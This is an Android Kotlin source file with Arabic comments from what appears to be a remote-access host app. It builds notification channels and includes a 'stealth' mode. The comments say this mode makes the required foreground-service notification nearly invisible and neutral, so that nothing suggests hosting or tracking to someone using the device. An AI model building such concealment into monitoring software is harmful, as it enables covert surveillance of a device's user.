package com.remotebridge.host.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.app.NotificationCompat
import com.remotebridge.MainActivity
import com.rbstudio.R

/**
 * مساعد لإنشاء الإشعارات وقنواتها بما يتوافق مع أندرويد 8+.
 *
 * 💤 B12 — وضع الإخفاء (stealth):
 *  - قناة منفصلة بأدنى أهمية (IMPORTANCE_MIN): لا تظهر أيقونة في شريط الحالة
 *    ولا يصدر أي صوت/اهتزاز/شارة، ويبقى الإشعار الدائمة المطلوب نظامياً
 *    للخدمة الأمامية شبه غير مرئي في أسفل قائمة الإشعارات فقط.
 *  - المحتوى محايد تماماً (اسم التطبيق فقط + نص فارغ) بلا أي إشارة إلى
 *    "مضيف/خادم/تتبع" — لإخفاء طبيعة النشاط عن أي متطفل على الجهاز.
 * حدّ نظامي ثابت: أندرويد لا يسمح بخدمة أمامية بدون إشعار على الإطلاق،
 * و MODE_MIN هو الحد الأدنى القانوني الذي يلبي مطلب "لا شيء يوحي بالتتبع".
 */
object NotificationHelper {

    const val CHANNEL_ID = "bridge_host_channel"
    const val CHANNEL_ID_STEALTH = "bridge_host_channel_min"
    const val NOTIFICATION_ID = 1001

    /**
     * ينشئ قناة الإشعارات (مطلوب على أندرويد 8+).
     */
    fun createChannel(context: Context, stealth: Boolean = false) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val manager = context.getSystemService(NotificationManager::class.java) ?: return
        // القناة القديمة تبقى موجودة (توافق الإصدارات السابقة) بأدنى أهمية أصلاً
        val legacy = NotificationChannel(
            CHANNEL_ID,
            context.getString(R.string.host_channel_name),
            NotificationManager.IMPORTANCE_MIN
        ).apply { setShowBadge(false) }
        manager.createNotificationChannel(legacy)
        val id = if (stealth) CHANNEL_ID_STEALTH else CHANNEL_ID
        if (manager.getNotificationChannel(id) != null) return
        val importance = if (stealth) NotificationManager.IMPORTANCE_MIN else NotificationManager.IMPORTANCE_LOW
        val channel = NotificationChannel(id, context.getString(R.string.host_channel_name), importance).apply {
            description = context.getString(R.string.host_notification_text)
            setShowBadge(false)
        }
        manager.createNotificationChannel(channel)
    }

    /**
     * يبني إشعار الخدمة الأمامية. في وضع الإخفاء يكون المحتوى محايداً تماماً.
     */
    fun buildHostNotification(context: Context, stealth: Boolean = false): Notification {
        val intent = Intent(context, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            context,
            0,
            intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val channelId = if (stealth) CHANNEL_ID_STEALTH else CHANNEL_ID
        val priority = if (stealth) NotificationCompat.PRIORITY_MIN else NotificationCompat.PRIORITY_LOW
        val builder = NotificationCompat.Builder(context, channelId)
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setOngoing(true)
            .setSilent(true)
            .setContentIntent(pendingIntent)
            .setPriority(priority)
            .setVisibility(NotificationCompat.VISIBILITY_PRIVATE)
        if (stealth) {
            // عنوان محايد = اسم التطبيق فقط، ونص فارغ — لا شيء يوحي بنشاط أو تتبع
            builder.setContentTitle(context.getString(R.string.app_name))
            builder.setContentText("")
        } else {
            builder.setContentTitle(context.getString(R.string.host_notification_title))
            builder.setContentText(context.getString(R.string.host_notification_text))
        }
        return builder.build()
    }
}
